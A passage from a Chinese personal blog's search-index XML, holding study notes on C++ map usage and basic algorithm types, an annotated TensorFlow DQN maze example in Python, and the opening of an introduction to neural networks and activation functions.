<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m;	<span class="comment">//定义</span></span><br><span class="line">m[“haha”] = <span class="number">5</span>;	<span class="comment">//键值对</span></span><br><span class="line"><span class="keyword">if</span> (m.find(“hoho”) != m.end())	<span class="comment">//存在hoho为key的元素（find根据key查找是否存在相应元素，若存在则返回相应的迭代器，若不存在返回尾部的迭代器即end）</span></span><br><span class="line">m.erase(m.find(“heihei”));	<span class="comment">//删除指针所指的元素（find返回迭代器，类似指针）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>map的遍历</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator mi=m.begin(); mi!=m.end();++mi) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; mi-&gt;first &lt;&lt; <span class="string">" "</span> &lt;&lt; mi-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如，实现字典，每个单词有一个解释，然后对于一些单词查询，输出对应的解释：<code>map&lt;string, string&gt; m;</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="2-2-学习常见算法"><a href="#2-2-学习常见算法" class="headerlink" title="2.2-学习常见算法"></a>2.2-学习常见算法</h3><ul>
<li>常见题型<ul>
<li>模拟题</li>
<li>贪心题</li>
<li>搜索题</li>
<li>动态规划（DP）题</li>
<li>图论题</li>
<li>数学题</li>
</ul>
</li>
<li>模拟<ul>
<li>所谓模拟法：用计算机的某些操作，模拟现实世界中的事物的变化，从而完成相应任务的方法；</li>
<li>实际上，一般会先根据题意，针对样例数据，用纸笔，模拟计算一遍，理清各数据之间的内在逻辑联系，从而理解题意，为建立数学模型、设计算法奠定基础；</li>
<li>特点：细节要求很多，代码可能会很长很长</li>
</ul>
</li>
<li>贪心<ul>
<li>所谓贪心算法：在对问题求解时，总是做出在当前看来是最好的选择；</li>
<li>也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解；</li>
<li>贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择；</li>
<li>注意：贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关；</li>
<li>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性；</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>强化学习-DQN-代码实现</title>
    <url>/2019/05/06/etc/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0-DQN-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>GitHub地址：<a href="https://github.com/21Gun5/DQN-code" target="_blank" rel="noopener">https://github.com/21Gun5/DQN-code</a></p>
<p>莫烦python教程地址：<a href="https://morvanzhou.github.io/tutorials/machine-learning/reinforcement-learning/4-3-DQN3/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/machine-learning/reinforcement-learning/4-3-DQN3/</a></p>
<p>下面是相关代码及注释（环境模块未深究代码实现）</p>
<p>注：暂未完全搞懂！待学习<a id="more"></a></p>
<h2 id="main-py"><a href="#main-py" class="headerlink" title="main.py"></a>main.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> maze_env <span class="keyword">import</span> Maze   <span class="comment"># 环境模块，只看思想，未深究代码实现</span></span><br><span class="line"><span class="keyword">from</span> RL_brain <span class="keyword">import</span> DeepQNetwork   <span class="comment"># RL的大脑，负责思维和决策</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_maze</span><span class="params">()</span>:</span></span><br><span class="line">    step = <span class="number">0</span>    <span class="comment"># 用来控制何时学习的变量；步数，开始为0</span></span><br><span class="line">    <span class="keyword">for</span> episode <span class="keyword">in</span> range(<span class="number">300</span>):  <span class="comment"># 共训练300回合/轮</span></span><br><span class="line">        observation = env.reset()   <span class="comment"># 初始化环境，返回state的观测值（state与observation同义），此处为格子位置</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            env.render()    <span class="comment"># 刷新可视化环境（为了能看清每一步是怎么走的）</span></span><br><span class="line"></span><br><span class="line">            action = RL.choose_action(observation)  <span class="comment"># 根据观测值即位置来选择动作</span></span><br><span class="line">            observation_, reward, done = env.step(action)   <span class="comment"># 执行动作并返回新观测值（即新格子的地址）、奖励与done标记</span></span><br><span class="line">            RL.store_transition(observation, action, reward, observation_)      <span class="comment"># 将记忆（新旧观测值、动作、奖励）存储下来</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 控制学习的起始时间、频率</span></span><br><span class="line">            <span class="keyword">if</span> (step &gt; <span class="number">200</span>) <span class="keyword">and</span> (step % <span class="number">5</span> == <span class="number">0</span>):</span><br><span class="line">                RL.learn()</span><br><span class="line"></span><br><span class="line">            observation = observation_      <span class="comment"># 将新观测值作为下一次的初始观测值（本回合内的下一次）</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 当天堂/地狱，结束循环，即结束本回合，进入下一个</span></span><br><span class="line">            <span class="keyword">if</span> done:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            step += <span class="number">1</span>       <span class="comment"># 总步数+1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 全部回合结束，销毁环境</span></span><br><span class="line">    print(<span class="string">'game over'</span>)</span><br><span class="line">    env.destroy()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    同Q-learning，仍是迷宫游戏</span></span><br><span class="line"><span class="string">    不同的是采取DQN算法</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    env = Maze()    <span class="comment"># 构建环境</span></span><br><span class="line">    <span class="comment"># 构建RL机器人，一系列操作（如执行、学习）的执行者</span></span><br><span class="line">    RL = DeepQNetwork(env.n_actions, env.n_features,</span><br><span class="line">                      learning_rate=<span class="number">0.01</span>,</span><br><span class="line">                      reward_decay=<span class="number">0.9</span>,</span><br><span class="line">                      e_greedy=<span class="number">0.9</span>,</span><br><span class="line">                      replace_target_iter=<span class="number">200</span>,</span><br><span class="line">                      memory_size=<span class="number">2000</span>,</span><br><span class="line">                    <span class="comment">#   output_graph=True</span></span><br><span class="line">                      )</span><br><span class="line">    env.after(<span class="number">100</span>, run_maze)        <span class="comment"># tkinter的形式来调用run_maze函数，100为间隔时间，单位ms</span></span><br><span class="line">    env.mainloop()      <span class="comment"># 环境模块由tkinter实现，在此启动tkinter，即以窗口形式显示环境                 </span></span><br><span class="line">    RL.plot_cost()      <span class="comment"># 显示神经网络的误差曲线</span></span><br></pre></td></tr></table></figure>
<h2 id="RL-brain-py"><a href="#RL-brain-py" class="headerlink" title="RL_brain.py"></a>RL_brain.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> maze_env <span class="keyword">import</span> Maze</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">1</span>)   <span class="comment"># 设置随机数生成器的种子；若设置相同的种子，则每次生成的随机数也相同，若不设置则随机数不同</span></span><br><span class="line">tf.set_random_seed(<span class="number">1</span>)   <span class="comment"># python有自带的seed函数，此处np、tf的设置种子函数与其同思想</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 离线学习的DQN算法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DeepQNetwork</span>:</span></span><br><span class="line">    <span class="comment"># 定义初始值</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            self,</span></span></span><br><span class="line"><span class="function"><span class="params">            n_actions,</span></span></span><br><span class="line"><span class="function"><span class="params">            n_features,</span></span></span><br><span class="line"><span class="function"><span class="params">            learning_rate=<span class="number">0.01</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            reward_decay=<span class="number">0.9</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            e_greedy=<span class="number">0.9</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            replace_target_iter=<span class="number">300</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            memory_size=<span class="number">500</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            batch_size=<span class="number">32</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            e_greedy_increment=None,</span></span></span><br><span class="line"><span class="function"><span class="params">            output_graph=False, # 是否输出tensorboard文件</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span>:</span></span><br><span class="line">        self.n_actions = n_actions      <span class="comment"># 动作空间的大小，为4</span></span><br><span class="line">        self.n_features = n_features    <span class="comment"># 观测值的维度；为2；如(x,y）坐标表示一个点，就可说state的维度为2，即feature为2；基本思想便是通过feature来预测action（在这feature与state同义）</span></span><br><span class="line">        self.lr = learning_rate         <span class="comment"># 学习率</span></span><br><span class="line">        self.gamma = reward_decay       <span class="comment"># 奖励衰减值</span></span><br><span class="line">        self.epsilon_max = e_greedy     <span class="comment"># 贪婪度（根据Q表选行为的概率，否则其他方式，如随机选）</span></span><br><span class="line">        self.replace_target_iter = replace_target_iter      <span class="comment"># 替换target_net参数的频率（每x步）</span></span><br><span class="line">        self.memory_size = memory_size      <span class="comment"># 记忆上限</span></span><br><span class="line">        self.batch_size = batch_size        <span class="comment"># 神经网络中，随机梯度下降时用到的批量；批量是在单次迭代中，计算梯度的样本总数；</span></span><br><span class="line">        self.epsilon_increment = e_greedy_increment     <span class="comment">#</span></span><br><span class="line">        self.epsilon = <span class="number">0</span> <span class="keyword">if</span> e_greedy_increment <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">else</span> self.epsilon_max     <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">        self.learn_step_counter = <span class="number">0</span>     <span class="comment"># 总的学习步数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 初始化记忆</span></span><br><span class="line">        self.memory = np.zeros((self.memory_size, n_features * <span class="number">2</span> + <span class="number">2</span>))      <span class="comment"># 初始值为0；要存[s,a,r,s_]，s和s_各有2个维度，a和r各1个，故x2+2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 建立所需的2个神经网络</span></span><br><span class="line">        self._build_net()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 替代参数</span></span><br><span class="line">        t_params = tf.get_collection(<span class="string">'target_net_params'</span>)</span><br><span class="line">        e_params = tf.get_collection(<span class="string">'eval_net_params'</span>)</span><br><span class="line">        self.replace_target_op = [tf.assign(t, e) <span class="keyword">for</span> t, e <span class="keyword">in</span> zip(t_params, e_params)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建session（tensorflow运行必需的）</span></span><br><span class="line">        self.sess = tf.Session()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 是否输出tensorboard文件</span></span><br><span class="line">        <span class="keyword">if</span> output_graph:</span><br><span class="line">            <span class="comment"># $ tensorboard --logdir=logs，shell中运行，将其作为日志路径；随后IP:6006访问</span></span><br><span class="line">            tf.summary.FileWriter(<span class="string">"logs/"</span>, self.sess.graph)</span><br><span class="line"></span><br><span class="line">        self.sess.run(tf.global_variables_initializer())       <span class="comment"># 初始化所有变量；tf要用sess的run来运行功能语句，是其基本语法</span></span><br><span class="line">        self.cost_his = []      <span class="comment"># 记录误差，plot_cost会用到</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建神经网络</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_build_net</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 构建 evaluate_net 神经网络，及时提升/更新参数</span></span><br><span class="line">        <span class="comment"># 共两个输入：state状态值、Q值</span></span><br><span class="line">        self.s = tf.placeholder(tf.float32, [<span class="keyword">None</span>, self.n_features], name=<span class="string">'s'</span>)  <span class="comment"># 输入，用来接收observation观测值，即状态值</span></span><br><span class="line">        self.q_target = tf.placeholder(tf.float32, [<span class="keyword">None</span>, self.n_actions], name=<span class="string">'Q_target'</span>)  <span class="comment"># 输入，用来接收q_target的值，即Q值</span></span><br><span class="line">        <span class="comment"># 添加层</span></span><br><span class="line">        <span class="keyword">with</span> tf.variable_scope(<span class="string">'eval_net'</span>):     <span class="comment"># 层的配置</span></span><br><span class="line">            c_names = [<span class="string">'eval_net_params'</span>, tf.GraphKeys.GLOBAL_VARIABLES]    <span class="comment"># c_names是一个集合，里面存储着变量；要通过集合名来调用变量</span></span><br><span class="line">            n_l1 = <span class="number">10</span>       <span class="comment"># 第一层有10个节点；有上下左右4个动作，故第二层有4个节点）</span></span><br><span class="line">            w_initializer = tf.random_normal_initializer(<span class="number">0.</span>, <span class="number">0.3</span>)       <span class="comment"># 权重weight的初始值，为介于0-0.3的随机值</span></span><br><span class="line">            b_initializer = tf.constant_initializer(<span class="number">0.1</span>)        <span class="comment"># 偏移bias的初始值，为常数0.1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 第一层</span></span><br><span class="line">            <span class="keyword">with</span> tf.variable_scope(<span class="string">'l1'</span>):</span><br><span class="line">                <span class="comment"># 用c_names集合中的变量，对权重和偏移进行赋值</span></span><br><span class="line">                w1 = tf.get_variable(<span class="string">'w1'</span>, [self.n_features, n_l1], initializer=w_initializer, collections=c_names)</span><br><span class="line">                b1 = tf.get_variable(<span class="string">'b1'</span>, [<span class="number">1</span>, n_l1], initializer=b_initializer, collections=c_names)</span><br><span class="line">                <span class="comment"># 计算真实值，与预测值相比较得损失</span></span><br><span class="line">                l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1)     <span class="comment"># 由(s,w1,b1)而得l1层真实值；matmul为矩阵乘法；relu激励函数，将直线“掰弯”变为非线性</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 第二层</span></span><br><span class="line">            <span class="keyword">with</span> tf.variable_scope(<span class="string">'l2'</span>):</span><br><span class="line">                w2 = tf.get_variable(<span class="string">'w2'</span>, [n_l1, self.n_actions], initializer=w_initializer, collections=c_names)</span><br><span class="line">                b2 = tf.get_variable(<span class="string">'b2'</span>, [<span class="number">1</span>, self.n_actions], initializer=b_initializer, collections=c_names)</span><br><span class="line">                self.q_eval = tf.matmul(l1, w2) + b2        <span class="comment"># 无激励函数，仍线性</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构建target_net神经网络，（注释参看eval_net的)</span></span><br><span class="line">        <span class="comment"># 一个输入</span></span><br><span class="line">        self.s_ = tf.placeholder(tf.float32, [<span class="keyword">None</span>, self.n_features], name=<span class="string">'s_'</span>)</span><br><span class="line">        <span class="comment"># 添加层</span></span><br><span class="line">        <span class="keyword">with</span> tf.variable_scope(<span class="string">'target_net'</span>):</span><br><span class="line">            c_names = [<span class="string">'target_net_params'</span>, tf.GraphKeys.GLOBAL_VARIABLES]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 第一层</span></span><br><span class="line">            <span class="keyword">with</span> tf.variable_scope(<span class="string">'l1'</span>):</span><br><span class="line">                w1 = tf.get_variable(<span class="string">'w1'</span>, [self.n_features, n_l1], initializer=w_initializer, collections=c_names)</span><br><span class="line">                b1 = tf.get_variable(<span class="string">'b1'</span>, [<span class="number">1</span>, n_l1], initializer=b_initializer, collections=c_names)</span><br><span class="line">                l1 = tf.nn.relu(tf.matmul(self.s_, w1) + b1)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 第二层</span></span><br><span class="line">            <span class="keyword">with</span> tf.variable_scope(<span class="string">'l2'</span>):</span><br><span class="line">                w2 = tf.get_variable(<span class="string">'w2'</span>, [n_l1, self.n_actions], initializer=w_initializer, collections=c_names)</span><br><span class="line">                b2 = tf.get_variable(<span class="string">'b2'</span>, [<span class="number">1</span>, self.n_actions], initializer=b_initializer, collections=c_names)</span><br><span class="line">                self.q_next = tf.matmul(l1, w2) + b2</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 定义损失如何计算</span></span><br><span class="line">        <span class="keyword">with</span> tf.variable_scope(<span class="string">'loss'</span>):</span><br><span class="line">            <span class="comment"># target为神经网络得到的预测值，eval为真实值，通过二者得损失</span></span><br><span class="line">            self.loss = tf.reduce_mean(tf.squared_difference(self.q_target, self.q_eval))       <span class="comment"># 先二者差的平方，再平均值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 训练（通过优化器减少损失)</span></span><br><span class="line">        <span class="keyword">with</span> tf.variable_scope(<span class="string">'train'</span>):</span><br><span class="line">            self._train_op = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss)     <span class="comment"># lr为学习率；使用优化器，力求减少损失</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 存储记忆（当前和下一步state、行为、奖励）</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">store_transition</span><span class="params">(self, s, a, r, s_)</span>:</span></span><br><span class="line">        <span class="comment"># 如果对象没有此属性，则创建且初始化为0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hasattr(self, <span class="string">'memory_counter'</span>):     <span class="comment"># hasattr判断对象是否包含对应的属性</span></span><br><span class="line">            self.memory_counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># (s,a,r,s_)为一条记忆记录</span></span><br><span class="line">        transition = np.hstack((s, [a, r], s_))     <span class="comment"># hstack沿着水平方向将数组堆叠起来（vstack沿竖直方向</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用新记录代替旧记录</span></span><br><span class="line">        index = self.memory_counter % self.memory_size      <span class="comment"># 计算索引；记忆是有上限的，故满了之后，要覆盖旧的；不论满与不满，索引都可(%size)得</span></span><br><span class="line">        self.memory[index, :] = transition      <span class="comment"># 插入记录或称覆盖记录</span></span><br><span class="line"></span><br><span class="line">        self.memory_counter += <span class="number">1</span>    <span class="comment"># 记忆数量+1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择行为</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choose_action</span><span class="params">(self, observation)</span>:</span></span><br><span class="line">        observation = observation[np.newaxis, :]      <span class="comment"># 原本观测值的维数与tf输入所需的不符，故升维</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 贪婪度=0.x，x0%的可能按最优Q值选择行为</span></span><br><span class="line">        <span class="keyword">if</span> np.random.uniform() &lt; self.epsilon:</span><br><span class="line">            actions_value = self.sess.run(self.q_eval, feed_dict=&#123;self.s: observation&#125;)     <span class="comment"># 变量赋值，并得到相应动作的Q值</span></span><br><span class="line">            action = np.argmax(actions_value)       <span class="comment"># 选择具有最大值的动作</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 贪婪度=0.x，1-x0%的可能随机选行为</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            action = np.random.randint(<span class="number">0</span>, self.n_actions)</span><br><span class="line">        <span class="keyword">return</span> action</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 学习</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">learn</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 按照频率来替代参数</span></span><br><span class="line">        <span class="keyword">if</span> self.learn_step_counter % self.replace_target_iter == <span class="number">0</span>:</span><br><span class="line">            self.sess.run(self.replace_target_op)</span><br><span class="line">            print(<span class="string">'\ntarget_params_replaced\n'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从记忆库中抽取批量记忆</span></span><br><span class="line">        <span class="keyword">if</span> self.memory_counter &gt; self.memory_size:</span><br><span class="line">            sample_index = np.random.choice(self.memory_size, size=self.batch_size)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sample_index = np.random.choice(self.memory_counter, size=self.batch_size)</span><br><span class="line">        batch_memory = self.memory[sample_index, :]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 得到相应的Q值</span></span><br><span class="line">        q_next, q_eval = self.sess.run(</span><br><span class="line">            [self.q_next, self.q_eval],</span><br><span class="line">            feed_dict=&#123;</span><br><span class="line">                self.s_: batch_memory[:, -self.n_features:],  <span class="comment"># fixed params</span></span><br><span class="line">                self.s: batch_memory[:, :self.n_features],  <span class="comment"># newest params</span></span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># change q_target w.r.t q_eval's action</span></span><br><span class="line">        q_target = q_eval.copy()</span><br><span class="line">        batch_index = np.arange(self.batch_size, dtype=np.int32)</span><br><span class="line">        eval_act_index = batch_memory[:, self.n_features].astype(int)</span><br><span class="line">        reward = batch_memory[:, self.n_features + <span class="number">1</span>]</span><br><span class="line">        q_target[batch_index, eval_act_index] = reward + self.gamma * np.max(q_next, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        For example in this batch I have 2 samples and 3 actions:</span></span><br><span class="line"><span class="string">        q_eval =</span></span><br><span class="line"><span class="string">        [[1, 2, 3],</span></span><br><span class="line"><span class="string">         [4, 5, 6]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        q_target = q_eval =</span></span><br><span class="line"><span class="string">        [[1, 2, 3],</span></span><br><span class="line"><span class="string">         [4, 5, 6]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Then change q_target with the real q_target value w.r.t the q_eval's action.</span></span><br><span class="line"><span class="string">        For example in:</span></span><br><span class="line"><span class="string">            sample 0, I took action 0, and the max q_target value is -1;</span></span><br><span class="line"><span class="string">            sample 1, I took action 2, and the max q_target value is -2:</span></span><br><span class="line"><span class="string">        q_target =</span></span><br><span class="line"><span class="string">        [[-1, 2, 3],</span></span><br><span class="line"><span class="string">         [4, 5, -2]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        So the (q_target - q_eval) becomes:</span></span><br><span class="line"><span class="string">        [[(-1)-(1), 0, 0],</span></span><br><span class="line"><span class="string">         [0, 0, (-2)-(6)]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        We then backpropagate this error w.r.t the corresponding action to network,</span></span><br><span class="line"><span class="string">        leave other action as error=0 cause we didn't choose it.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 训练神经网络</span></span><br><span class="line">        _, self.cost = self.sess.run([self._train_op, self.loss],</span><br><span class="line">                                     feed_dict=&#123;self.s: batch_memory[:, :self.n_features],</span><br><span class="line">                                                self.q_target: q_target&#125;)</span><br><span class="line">        self.cost_his.append(self.cost)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># increasing epsilon</span></span><br><span class="line">        self.epsilon = self.epsilon + self.epsilon_increment <span class="keyword">if</span> self.epsilon &lt; self.epsilon_max <span class="keyword">else</span> self.epsilon_max</span><br><span class="line">        self.learn_step_counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示误差，即学习效果（可选）</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">plot_cost</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">        plt.plot(np.arange(len(self.cost_his)), self.cost_his)</span><br><span class="line">        plt.ylabel(<span class="string">'Cost'</span>)      <span class="comment"># 纵坐标名称</span></span><br><span class="line">        plt.xlabel(<span class="string">'training steps'</span>)        <span class="comment"># 横坐标名称</span></span><br><span class="line">        plt.show()      <span class="comment"># 显示图像</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    env = Maze()</span><br><span class="line">    RL = DeepQNetwork(env.n_actions, env.n_features,</span><br><span class="line">                      learning_rate=<span class="number">0.01</span>,</span><br><span class="line">                      reward_decay=<span class="number">0.9</span>,</span><br><span class="line">                      e_greedy=<span class="number">0.9</span>,</span><br><span class="line">                      replace_target_iter=<span class="number">200</span>,</span><br><span class="line">                      memory_size=<span class="number">2000</span>,</span><br><span class="line">                      <span class="comment"># output_graph=True</span></span><br><span class="line">                      )</span><br><span class="line"></span><br><span class="line">    observation = env.reset()</span><br><span class="line">    print(observation)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习-神经网络简介</title>
    <url>/2019/05/02/etc/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="神经网络简介"><a href="#神经网络简介" class="headerlink" title="神经网络简介"></a>神经网络简介</h2><h3 id="01-问题引出"><a href="#01-问题引出" class="headerlink" title="01-问题引出"></a>01-问题引出</h3><ul>
<li><p>以下分类问题属于非线性问题（图 1. 非线性分类问题）；</p>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/FeatureCrosses1.png" alt="直角坐标曲线图。传统的 x 轴用“x1”标记。传统的 y 轴用“x2”标记。蓝点占据西北和东南象限；黄点占据西南和东北象限。"></p>
</li>
<li><p>“非线性”意味着：无法使用形式为<code>b + w1x1 + w2x2</code>的模型，来准确预测标签，即“决策面”不是直线；<a id="more"></a></p>
</li>
<li><p><strong>特征组合</strong>是对非线性问题进行建模的一种可行方法；</p>
</li>
<li><p>若考虑以下数据集（图 2. 更难的非线性分类问题），其所示的数据集问题无法用线性模型解决；</p>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/NonLinearSpiral.png" alt="数据集包含许多橙点和蓝点。很难确定一个连贯的图案，但橙点依稀呈螺旋状，而蓝点可能会呈不同的螺旋状。"></p>
</li>
<li><p>神经网络如何解决非线性问题？首先用图表呈现一个线性模型（图 3. 用图表呈现的线性模型）；</p>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/linear_net.svg" alt="同一行中三个蓝色圆圈通过箭头与其上方的绿色圆圈相连"></p>
<ul>
<li>蓝色圆圈：输入特征；</li>
<li>绿色圆圈：各个输入的加权和。</li>
</ul>
</li>
<li><p>要提高此模型处理非线性问题的能力，如何改进？</p>
</li>
</ul>
<h3 id="02-隐藏层"><a href="#02-隐藏层" class="headerlink" title="02-隐藏层"></a>02-隐藏层</h3><ul>
<li><p>如下模型中，添加了一个表示中间值的“隐藏层”，其中（图 4. 两层模型的图表）；</p>
<ul>
<li>黄色节点：蓝色输入节点值的加权和；</li>
<li>输出：黄色节点的加权和。</li>
</ul>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/1hidden.svg" alt="同一行中三个标为“输入”的蓝色圆圈通过箭头与其上方的一行标为“隐藏层”的黄色圆圈相连，这些黄色圆圈转而与顶部标为“输出”的绿色圆圈相连。"></p>
</li>
<li><p>此模型是线性的吗？是的，其输出仍是其输入的线性组合；</p>
</li>
<li><p>如下模型中，又添加了一个表示加权和的“隐藏层”，（图 5. 三层模型的图表）；</p>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/2hidden.svg" alt="同一行中三个标为“输入”的蓝色圆圈通过箭头与其上方的一行标为“隐藏层 1”的黄色圆圈相连，这些黄色圆圈转而与其上方另一行标为“隐藏层 2”的黄色圆圈相连，而这些黄色圆圈转而又与顶部的绿色圆圈相连。"></p>
</li>
<li><p>此模型仍是线性的吗？是的，将输出表示为输入的函数，并进行简化时，只是获得输入的另一个加权和而已；</p>
</li>
<li>该加权和仍无法对非线性问题进行有效建模；</li>
</ul>
<h3 id="03-激活函数"><a href="#03-激活函数" class="headerlink" title="03-激活函数"></a>03-激活函数</h3><ul>
<li><p>要对非线性问题进行建模，可直接引入非线性函数；</p>
</li>
<li><p>可用非线性函数将每个隐藏层节点像管道一样连接起来；</p>
</li>
<li><p>如下模型中，在隐藏层 1 中的各个节点的值传递到下一层进行加权求和之前，采用一个非线性函数对其进行了转换，（图 6. 包含激活函数的三层模型的图表）；</p>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/activation.svg" alt="除了在两个隐藏层之间添加了一行标为“非线性转换层”的粉色圆圈之外，与上一个图一样。"></p>
</li>
<li><p>上述非线性函数便是<strong>激活函数</strong>；</p>
</li>
<li><p>现在，已经添加了激活函数，如果再添加层，将会产生更多影响；</p>
<ul>
<li>通过在非线性上堆叠非线性，能够对输入和预测输出之间的，极其复杂的关系，进行建模；</li>
<li>简言之，每一层均可通过原始输入，有效学习，更复杂、更高级别的函数；</li>
</ul>
</li>
</ul>
<h3 id="04-常见激活函数"><a href="#04-常见激活函数" class="headerlink" title="04-常见激活函数"></a>04-常见激活函数</h3><ul>
<li><p><strong>S 型</strong>激活函数将加权和转换为介于 0 和 1 之间的值；</p>
</li>
<li><p>$F(x)=\frac{1} {1+e^{-x}}$，如图（图 7. S 型激活函数）；</p>
<p><img src="https://developers.google.com/machine-learning/crash-course/images/sigmoid.svg" alt="S 型函数。"></p>
</li>
<li><p>相较于 S 型函数等平滑函数，<strong>修正线性单元</strong>激活函数（简称 <strong>ReLU</strong>）的效果通常要好一点，同时还易于计算；</p>
</li>
<li><p>$F(x)=max(0,x)$，如图，（图 8. ReLU 激活函数）</p>
